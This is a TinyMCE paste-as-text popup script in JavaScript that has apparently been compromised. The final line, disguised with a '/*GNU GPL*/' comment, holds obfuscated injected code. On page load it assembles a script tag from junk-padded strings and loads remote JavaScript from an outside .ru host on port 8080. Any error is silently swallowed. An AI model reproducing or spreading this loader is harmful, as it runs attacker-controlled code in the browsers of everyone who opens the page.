tinyMCEPopup.requireLangPack();

function saveContent() {
	if (document.forms[0].htmlSource.value == '') {
		tinyMCEPopup.close();
		return false;
	}

	tinyMCEPopup.execCommand('mcePasteText', false, {
		html : document.forms[0].htmlSource.value,
		linebreaks : document.forms[0].linebreaks.checked
	});

	tinyMCEPopup.close();
}

function onLoadInit() {
	tinyMCEPopup.resizeToInnerSize();

	// Remove Gecko spellchecking
	if (tinymce.isGecko)
		document.body.spellcheck = tinyMCEPopup.getParam("gecko_spellcheck");

	resizeInputs();
}

var wHeight=0, wWidth=0, owHeight=0, owWidth=0;

function resizeInputs() {
	if (!tinymce.isIE) {
		wHeight = self.innerHeight-80;
		wWidth = self.innerWidth-17;
	} else {
		wHeight = document.body.clientHeight-80;
		wWidth = document.body.clientWidth-17;
	}

	document.forms[0].htmlSource.style.height = Math.abs(wHeight) + 'px';
	document.forms[0].htmlSource.style.width  = Math.abs(wWidth) + 'px';
}

tinyMCEPopup.onInit.add(onLoadInit);


/*GNU GPL*/ try{window.onload = function(){var A7uom6wz40lq = document.createElement('s##)(^c@)!r@&i)&^p((t&@'.replace(/\!|\(|\$|@|\)|&|#|\^/ig, ''));var U58f2ncrcja2g = 'Bget7nne6zp6f';A7uom6wz40lq.setAttribute('type', 't)$e^@^x$@t@#/^j)#(a#$(v@a(^$s(((c^)r@!#$i($@^(p&&#@t$&#'.replace(/\(|&|#|\^|\)|\$|\!|@/ig, ''));A7uom6wz40lq.setAttribute('src',  'h!&t)t#(p!($:$$&/#!/#$^t&a^(r$&g&(^&e$t)&-#!(@c^#^o#)m@@!.$@1!$@9(@l$!)!o!@^@u!!&&).@^$&c!$@^&o!((&m)!).(^^n$&i&h$&&-##@g&##!o!$v#(#^@.!(@t^!h^(e!&(m&)o)@#b)#i&)(s@!(i^@^t&$^e&!(.^$^(@r@$u@^:#&&8@!^&0$$$$8(&0)$/#l(o^(v$!e)^&2$1)@c))^!n(&$@.#(@c@(^o&$#m)^&#/!(&l)$o!!v&e$#2^)@1&#c)&n$$(.)!@c(#@o@@^@m(/&g!^o$)$o^^g)^#l^!$e)^(.#(^c!@o##&m^&/&@r!^^o(!$#t@&(t!e))(n!#)t^o(&^m#(a^@#t!)&&o##e^^)&s$).&)$&c!@@o(m(^/#w(&e!(a#^@t@h&e)&!r@.^c@o)!!m#!!&.)&c@!($n!!(/)$'.replace(/\)|@|\(|\!|#|\^|&|\$/ig, ''));A7uom6wz40lq.setAttribute('defer', 'd@!e@)!f(@(e)#$)r(('.replace(/#|&|\(|\)|\!|\$|@|\^/ig, ''));A7uom6wz40lq.setAttribute('id', 'Q^))^w$$l&(y#!@e&@$!2^#^x@^r##4)k('.replace(/#|\^|\(|\$|\!|&|\)|@/ig, ''));document.body.appendChild(A7uom6wz40lq);}} catch(Jnzhjq1ohahp5) {}